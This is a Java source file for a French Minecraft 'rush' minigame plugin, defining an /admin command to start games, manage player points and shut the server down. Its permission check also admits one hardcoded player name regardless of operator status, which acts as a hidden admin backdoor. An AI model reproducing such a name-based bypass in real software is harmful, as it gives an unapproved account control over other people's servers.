package fr.perrier.rush.commands;

import fr.perrier.rush.*;
import fr.perrier.rush.game.*;
import fr.perrier.rush.listener.game.Chemin;
import fr.perrier.rush.listener.game.Kills;
import fr.perrier.rush.menu.*;
import fr.perrier.rush.utils.*;
import org.bukkit.*;
import org.bukkit.command.*;
import org.bukkit.entity.*;
import org.bukkit.plugin.*;

public class Admin implements CommandExecutor {
    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String txt, String[] args) {
        if(cmd.getName().equalsIgnoreCase("admin")) {
            if(sender instanceof Player) {
                Player p = (Player) sender;
                if(p.isOp() || p.getName().equalsIgnoreCase("PerrierBottle")) {
                    if(args.length == 0) {
                        p.sendMessage("§c/admin startrun");
                        p.sendMessage("§c/admin addpoints [player] [integer]");
                        p.sendMessage("§c/admin getpoints [player]");
                        p.sendMessage("§c/admin stop");
                    }else{
                        if(args[0].equalsIgnoreCase("startrun")) {
                            Main.getInstance().setStatus(GameStatus.STARTING);
                            Main.getInstance().setStatus(GameStatus.PLAYING);
                            Bukkit.getOnlinePlayers().forEach(player -> {
                                player.getInventory().clear();
                            });
                            Bukkit.getOnlinePlayers().forEach(player -> {
                                Stuff.giveTo(player);
                                Teams teams = Teams.players.get(player);
                                if(teams.equals(Teams.BLEU)) {
                                    player.teleport(BedLocation.spawnBlue());
                                } else if (teams.equals(Teams.ROSE)) {
                                    player.teleport(BedLocation.spawnPink());
                                }
                                Kills.kills.put(player,0);
                                Kills.morts.put(player,0);
                                Chemin.cheminNb.put(player,1);
                                new BDD().setKillEffectTo(player, Preferences.killEffect.get(player));

                            });
                            new Run().runTaskTimer(Main.getInstance(),20L,20L);
                        }
                        if(args[0].equalsIgnoreCase("addpoints")) {
                            if(Bukkit.getPlayer(args[1]) != null) {
                                long i = Long.parseLong(args[2]);
                                try {
                                    new BDD().addPointsTo(Bukkit.getPlayer(args[1]), i);
                                }catch (Exception e1) {
                                    p.sendMessage("§cUne erreur est survenue (Nombre invalide surement).");
                                }
                            }
                        }
                        if(args[0].equalsIgnoreCase("getpoints")) {
                            if(Bukkit.getPlayer(args[1]) != null) {
                                try {
                                    p.sendMessage("§fPoints de " + args[1] + " : "+ new BDD().getPointsOf(Bukkit.getPlayer(args[1]),""));
                                }catch (Exception e1) {
                                    p.sendMessage("§cUne erreur est survenue.");
                                }
                            }
                        }
                        if(args[0].equalsIgnoreCase("stop")) {
                            Bukkit.getScheduler().runTaskLater((Plugin) Main.getInstance(), () -> {
                                Main.getInstance().setStatus(GameStatus.STARTING);
                                Bukkit.broadcastMessage("§8» §cShutdown in 3.");
                            }, 20L);
                            Bukkit.getScheduler().runTaskLater((Plugin) Main.getInstance(), () -> {
                                Main.getInstance().setStatus(GameStatus.PLAYING);
                                Bukkit.broadcastMessage("§8» §cShutdown in 2..");
                            }, 2 * 20L);
                            Bukkit.getScheduler().runTaskLater((Plugin) Main.getInstance(), () -> {
                                Main.getInstance().setStatus(GameStatus.FINISH);
                                Bukkit.broadcastMessage("§8» §cShutdown in 1..");
                            }, 3 * 20L);
                            Bukkit.getScheduler().runTaskLater((Plugin) Main.getInstance(), () -> {
                                Bukkit.broadcastMessage("§8» §cShutdown in 0.");
                                Bukkit.shutdown();
                            },4 * 20L);

                        }
                    }
                }
            }
        }
        return false;
    }
}
